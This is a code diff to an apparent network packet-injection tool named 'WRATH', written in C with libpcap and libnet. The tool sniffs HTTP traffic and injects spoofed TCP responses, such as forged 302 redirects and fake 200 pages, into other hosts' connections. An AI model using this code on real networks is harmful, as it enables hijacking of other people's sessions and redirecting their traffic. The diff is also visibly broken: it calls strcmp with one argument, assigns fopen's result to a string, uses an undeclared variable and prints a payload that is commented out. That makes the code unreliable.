@@ -10,7 +10,7 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	struct lcp_package *package = (struct lcp_package *) args;
 	libnet_t *libnet_handle = package->libnet_handle;
 	struct arg_values *cline_args = package->cline_args;
-	struct inject_package i_pack;
+	char *app_cmd;
 	
 	/* test for input file:
 		if an input file exists, assume it contains all encoding information.
@@ -21,12 +21,25 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	   
 	   if an operation does not exist only pass null pointer.
 	*/
+	if (strcmp(cline_args->input_file) != "\0") // If an input file has been specified
+		app_cmd = fopen(cline_args->input_file, "r");
+	else if (strcmp(cline_args->command) != "\0") // If a command has been specified but not an input file
+		app_cmd = cline_args->command;
 
-
-	if (strstr(packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H) , "HTTP") != NULL) {
-		printf("HTTP Packet sniffed\n");
-		wrath_build_and_launch(args, packet, NULL);	
-	}
+	/* looks to see if an operation is set.
+	 * when operations are set packets are only launched in 
+	 * response to packets which share their operations 
+	 * protocol */
+	char *op = cline_args->operation;
+	if (strcmp(op, "http") == 0 || strcmp(op, "HTTP") == 0 ) {
+		wrath_http_nltocr(app_cmd);
+		if (strstr(packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H) , "HTTP") != NULL) {
+			printf("HTTP Packet sniffed\n");
+			wrath_build_and_launch(args, packet, &inject_pack);	
+		}
+	// else if (strcmp(op, "ftp") == 0 || strcmp(op, "FTP") == 0)
+	} else if (strcmp(op, "\0") == 0 || strcmp (op, "tcp") == 0 || strcmp(op, "TCP") == 0) // TCP is default
+			wrath_build_and_launch(args, packet, NULL);	
 }
 
 void wrath_build_and_launch(u_char *args, const u_char *packet, struct inject_package *i_pack) {
@@ -46,7 +59,7 @@ void wrath_build_and_launch(u_char *args, const u_char *packet, struct inject_pa
 	*/
 	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://ada.evergreen.edu/~stenic05\r\n\r\n";
 	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://en.wikipedia.org/wiki/Tupac_Shakur\r\n\r\n";
-	char payload[] = "HTTP/1.1 200 OK\r\nServer: Apache\r\n\r\n<html><a href=\"http://ada.evergreen.edu/~stenic05\">visit</a></html>";
+	//char payload[] = "HTTP/1.1 200 OK\r\nServer: WRATH\r\nConnection: close\r\nContent-Type: text/html; charset=utf-8\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n<html><img src=\"http://3.bp.blogspot.com/-Lz-g9K2Mc8A/UH-YAgdMRJI/AAAAAAAALoI/45KMc_bLRFc/s1600/papa_murphys_jack-o-lantern_pizza.jpg\"/></html>";
 
 	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
 	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
@@ -56,8 +69,8 @@ void wrath_build_and_launch(u_char *args, const u_char *packet, struct inject_pa
 	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
 	printf("With ... ");
 	printf("%s:%hu -->", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport)); // ip_src and ip_dst are in_addr structs
-	printf(" %s:%hu ", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
-	printf(": %s\n", payload);
+	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
+	printf("Payload: %s\n", payload);
 
 	printf("TCP SUM: %d\n", (cline_args->tcp_fin + cline_args->tcp_rst + cline_args->tcp_syn + cline_args->tcp_ack + cline_args->tcp_urg + cline_args->tcp_psh));
 
